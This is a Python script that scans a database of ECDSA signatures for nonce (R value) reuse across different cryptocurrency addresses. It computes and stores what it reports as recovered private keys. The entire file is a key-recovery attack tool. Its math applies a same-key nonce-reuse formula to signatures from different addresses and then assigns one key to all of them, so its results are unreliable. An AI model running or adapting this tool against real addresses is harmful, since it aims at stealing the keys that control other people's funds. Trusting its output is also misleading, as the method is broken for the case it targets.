#!/usr/bin/env python3
import sqlite3
from collections import defaultdict
from db_manager import get_connection, add_finding, add_recovered_key

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_collision(s1, z1, s2, z2, r):
    try:
        # k = (z1 - z2) / (s1 - s2) mod P
        k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
        # d = (s1 * k - z1) / r mod P
        d = ((s1 * k - z1) * pow(r, -1, P)) % P
        return d
    except:
        return None

def find_cross_address_collisions():
    """
    Search the database for R-values used across DIFFERENT addresses.
    This indicates a systemic flaw in a nonce generator.
    """
    conn = get_connection()
    c = conn.cursor()
    
    # Group by R_HEX to find cross-address usage
    c.execute("""
        SELECT r_hex, r_int, GROUP_CONCAT(DISTINCT address) as addresses, COUNT(DISTINCT address) as addr_count
        FROM signatures
        WHERE r_hex IS NOT NULL
        GROUP BY r_hex
        HAVING addr_count > 1
    """)
    collisions = c.fetchall()
    conn.close()
    
    if not collisions:
        print("[Collision] No cross-address R-collisions found.")
        return

    print(f"[Collision] Found {len(collisions)} systemic R-collisions!")
    
    for r_hex, r_int, addrs_str, count in collisions:
        addresses = addrs_str.split(',')
        print(f"  R: {r_hex[:20]}... | Used in {count} addresses: {addresses}")
        
        # We need signatures from two different addresses to solve
        conn = get_connection()
        c = conn.cursor()
        sigs = []
        for addr in addresses[:2]:
            c.execute("SELECT s_int, z_int, txid FROM signatures WHERE address = ? AND r_hex = ?", (addr, r_hex))
            sigs.append(c.fetchone())
        conn.close()
        
        if len(sigs) >= 2:
            s1, z1, tx1 = int(sigs[0][0]), int(sigs[0][1]), sigs[0][2]
            s2, z2, tx2 = int(sigs[1][0]), int(sigs[1][1]), sigs[1][2]
            
            if s1 == s2 and z1 == z2:
                print(f"    [-] Exact signature duplicate found (cannot solve).")
                continue
                
            privkey = solve_collision(s1, z1, s2, z2, int(r_int))
            if privkey:
                priv_hex = hex(privkey)[2:].zfill(64)
                print(f"    [!!!] SUCCESS! Key recovered via Cross-Address Collision: {priv_hex[:30]}...")
                for addr in addresses:
                    add_recovered_key(addr, priv_hex, method='Cross-Address R-Collision')
                    add_finding(addr, 'Cross-Address R-Collision', details={'r': r_hex, 'with': [a for a in addresses if a != addr]}, severity='Critical')

if __name__ == "__main__":
    find_cross_address_collisions()
